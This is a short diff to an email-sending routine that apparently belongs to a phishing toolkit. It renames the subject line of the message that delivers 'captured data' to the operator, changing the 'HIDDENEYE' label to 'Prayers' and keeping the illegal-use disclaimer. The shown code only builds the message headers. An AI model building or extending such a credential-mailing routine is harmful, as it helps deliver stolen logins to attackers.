@@ -24,7 +24,7 @@ def main():
     # Create the enclosing (outer) message
 
     outer = MIMEMultipart()
-    outer['Subject'] = "[ HIDDENEYE ]:: HERE IS YOUR CAPTURED DATA. (We don't support Illegal Use of Tool)"
+    outer['Subject'] = "[ Prayers ]:: HERE IS YOUR CAPTURED DATA. (We don't support Illegal Use of Tool)"
     outer['To'] = emailconfig.recipient_email
     outer['From'] = emailconfig.gmail_account
     outer.preamble = ''
